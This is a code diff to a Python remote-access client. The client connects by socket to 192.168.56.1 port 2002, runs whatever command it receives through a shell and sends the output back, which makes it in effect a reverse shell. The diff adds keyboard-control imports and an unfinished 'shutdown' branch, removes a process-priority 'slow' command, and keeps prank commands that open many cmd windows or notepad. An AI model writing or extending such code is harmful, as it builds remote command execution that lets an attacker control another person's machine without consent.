@@ -3,7 +3,7 @@ import subprocess
 import psutil
 import os
 import sys
-
+from pynput.keyboard import Key, Controller
 
 IP = '192.168.56.1'
 PORT = 2002
@@ -17,20 +17,21 @@ with socket.socket() as s:
             if command == 'spam':
                 for _ in range(10):
                     subprocess.Popen('start cmd', shell=True)
+                    s.send('[+] Command sent to client'.encode())
 
             elif command == 'note':
                 subprocess.Popen(f'echo Connected on port {PORT} > fichier.txt && start notepad fichier.txt', shell=True)
+                s.send('[+] Command sent to client'.encode())
 
-            elif command == 'slow':
-                p = psutil.Process(os.getpid())
-                p.nice(psutil.REALTIME_PRIORITY_CLASS)
-                p.cpu_affinity([0])
-            
+            elif command == 'shutdown':
+                keyboard = Controller
+                
+
             output = subprocess.run(command, shell=True, capture_output=True, text=True)
             output = output.stdout + output.stderr
 
             if not output:
-                output = "[INFO] NO OUTPUT"
+                output = "[+] NO OUTPUT"
             s.send(output.encode())
 
         except KeyboardInterrupt:
